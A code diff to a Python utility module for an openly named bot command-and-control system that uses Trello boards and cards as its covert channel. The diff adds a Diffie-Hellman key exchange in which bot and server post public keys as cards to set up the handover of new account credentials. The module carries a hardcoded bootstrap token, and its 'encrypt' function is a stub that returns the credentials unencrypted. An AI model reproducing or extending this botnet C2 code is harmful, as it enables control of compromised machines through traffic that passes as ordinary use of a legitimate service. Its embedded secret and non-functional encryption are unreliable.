@@ -1,5 +1,13 @@
 import requests
 import json
+import time
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import dh
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+from cryptography.hazmat.primitives.serialization import PublicFormat
+from cryptography.hazmat.primitives.serialization import Encoding
+from cryptography.hazmat.primitives.serialization import load_pem_public_key
+
 
 # maybe erase bootstrap
 BOOTSTRAP_TOKEN = '0371b95aaa9e16d0089fa4d55d078f5fab508c5af7e2d82a7c57aa6be908778b'
@@ -10,6 +18,8 @@ BOT_BOARD_NAME = 'command_and_control'
 BOT_LIST_NAME = 'commands'
 TRELLO_URL = 'https://api.trello.com/1/'
 SUCCESS = 200
+CRED_EXCH_SERVER_NAME = 'server public'
+CRED_EXCH_BOT_NAME = 'bot public'
 CRED_ANS_CARD_NAME = 'new creds'
 CRED_REQ_CARD_NAME = 'request for new account'
 KEY_TOKEN_SEPERATOR = ':'
@@ -24,7 +34,11 @@ INVALID_CREDENTIALS = -2
 NOT_FOUND = -3
 BOOTSTRAP_ERROR = -4
 
-# TODO make the utils generic in regards to key,token since server uses many of them
+# The following parameters are used for the DH key exchange
+# The prime number
+p = 29739679543180524160021835543604539821811579405405583199405505326297620271484751480338037187027684595911229607038485819081286477097448632828504536935394825409449842628083332063130996649777224854811107574001396505771951354034946651162140577581354146386552642546875549771853233622743781203464439309008843343967571040084387433256394222088618262706531100968939446626355269412353139634643601431673464249997409799127539594414900602280217364145967192168101605187105301666520557939370021569004809862785353023069541918338921997446202874565302679741991840117391873037497978777538749325971146550086939289461425803458409792355343
+# The generator value
+g = 2
 
 
 def check_response(response, err_message):
@@ -236,6 +250,61 @@ def delete_board(key, token, board_id):
     if (check_response(response, "ERROR: failed to delete board. id = " + board_id) < 0):
         return HTTP_ERROR
     return 0
+
+
+def get_DH_parameters():
+    parameters = dh.DHParameterNumbers(p=p, g=g)
+    return parameters.parameters()
+
+
+def encrypt(key, new_creds):
+    return new_creds
+
+
+def exchange_keys(key, token, list_id, is_server=False):
+    # generate private and public key
+    parameters = get_DH_parameters()
+    private_key = parameters.generate_private_key()
+    public_key = private_key.public_key()
+    public_key_bytes = public_key.public_bytes(encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo)
+    other_public_key_bytes = None
+    if is_server:
+        my_card_name = CRED_EXCH_SERVER_NAME
+        other_card_name = CRED_EXCH_BOT_NAME
+    else:
+        my_card_name = CRED_EXCH_BOT_NAME
+        other_card_name = CRED_EXCH_SERVER_NAME
+    # send public key to bootstrap
+    if create_card(key, token, list_id, my_card_name, public_key_bytes) < 0:
+        print("ERROR: could not post public key.")
+
+    # wait for public key from bootstrap
+    while True:
+        cards = get_cards_in_list(key, token, list_id)
+        if len(cards) == 0:
+            print("ERROR: could not get cards in list")
+            return None
+        for card in cards:
+            if card['name'] == other_card_name:
+                other_public_key_bytes = card['desc']
+                if not other_public_key_bytes:
+                    print("ERROR: invalid public key received. looking for new...")
+                    continue
+                break
+        if other_public_key_bytes:
+            break
+        time.sleep(10)
+
+    if not other_public_key_bytes:
+        print("ERROR: could not get public key.")
+        return None
+    # generate shared secret
+    other_public_key = load_pem_public_key(bytes(other_public_key_bytes, 'utf-8'))
+    shared_key = private_key.exchange(other_public_key)
+    # derive key from shared secret
+    derived_key = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b'handshake data').derive(shared_key)
+    return derived_key
+
 
 # def move_card_to_list(key, token, card_id, list_id):
 #     url_details = '/cards/' + card_id + '/idList'
